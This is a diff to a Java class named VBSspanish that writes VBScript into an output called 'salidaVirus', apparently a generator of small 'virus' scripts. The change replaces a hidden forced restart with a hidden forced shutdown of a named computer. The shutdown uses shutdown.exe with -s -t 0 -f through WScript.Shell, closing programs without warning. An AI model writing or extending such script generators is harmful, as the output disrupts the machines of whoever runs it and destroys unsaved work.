@@ -61,8 +61,10 @@ public class VBSspanish {
                 }
                 else if (option == 3)
                 {
-                    salidaVirus.println("rc = objShell.Run \"C:\\WINDOWS\\system32\\shutdown.exe -r -t 0\", 0, True");
-                    salidaVirus.println("If rc <> 0 Then MsgBox \"shutdown failed with exit code \" & rc & \".\"");
+                    salidaVirus.println("\' -s = shutdown, -t 0 = no timeout, -f = force programs to close");
+                    salidaVirus.println("strShutdown = \"shutdown.exe -s -t 0 -f -m \\\" & strComputer");
+                    salidaVirus.println("set objShell = CreateObject(\"WScript.Shell\")");
+                    salidaVirus.println("objShell.Run strShutdown, 0, false");
                 }
                 else if (option == 4)
                 {
